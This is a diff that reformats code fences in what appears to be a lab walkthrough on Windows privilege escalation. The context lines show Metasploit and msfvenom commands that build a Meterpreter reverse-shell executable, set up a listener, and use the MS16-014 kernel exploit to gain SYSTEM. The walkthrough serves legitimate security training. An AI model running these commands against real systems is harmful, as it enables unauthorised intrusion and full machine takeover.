@@ -1655,16 +1655,16 @@ First, we need to create a payload and set up a listener to get a basic shell on
 
 1.  **Start Metasploit and Configure the Listener**
 
-    Bash
+    
 
-    ```
+    ```Bash
     msfconsole
 
     ```
 
-    Ruby
+    
 
-    ```
+    ```Ruby
     msf6 > use multi/handler
     msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
     msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>
@@ -1676,9 +1676,9 @@ First, we need to create a payload and set up a listener to get a basic shell on
 
     Open a new terminal window on your Kali VM. Use msfvenom to create the executable.
 
-    Bash
+    
 
-    ```
+    ```Bash
     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<Your Kali VM IP Address> -f exe -o shell.exe
 
     ```
@@ -1698,9 +1698,9 @@ With a low-privilege session active, we will use Metasploit's suggester to find 
 
     Background your current Meterpreter session by pressing Ctrl+Z and then run the local_exploit_suggester module.
 
-    Ruby
+    
 
-    ```
+    ```Ruby
     meterpreter > background
     msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
     msf6 post(multi/recon/local_exploit_suggester) > set SESSION <Your Session ID>
@@ -1714,9 +1714,9 @@ With a low-privilege session active, we will use Metasploit's suggester to find 
 
     Now, load the exploit module identified by the suggester.
 
-    Ruby
+    
 
-    ```
+    ```Ruby
     msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_014_wmi_recv_notif
     msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > set SESSION <Your Session ID>
     msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > set LPORT 5555
@@ -1727,9 +1727,9 @@ With a low-privilege session active, we will use Metasploit's suggester to find 
 
     Execute the module to exploit the kernel vulnerability.
 
-    Ruby
+    
 
-    ```
+    ```Ruby
     msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > run
 
     ```
@@ -1754,9 +1754,9 @@ If the exploit is successful, Metasploit will create a new, high-privilege sessi
 
     Enter the new session and use the getuid command to confirm your identity.
 
-    Ruby
+    
 
-    ```
+    ```Ruby
     msf6 exploit(windows/local/ms16_014_wmi_recv_notif) > sessions -i 2
     meterpreter > getuid
     Server username: NT AUTHORITY\SYSTEM
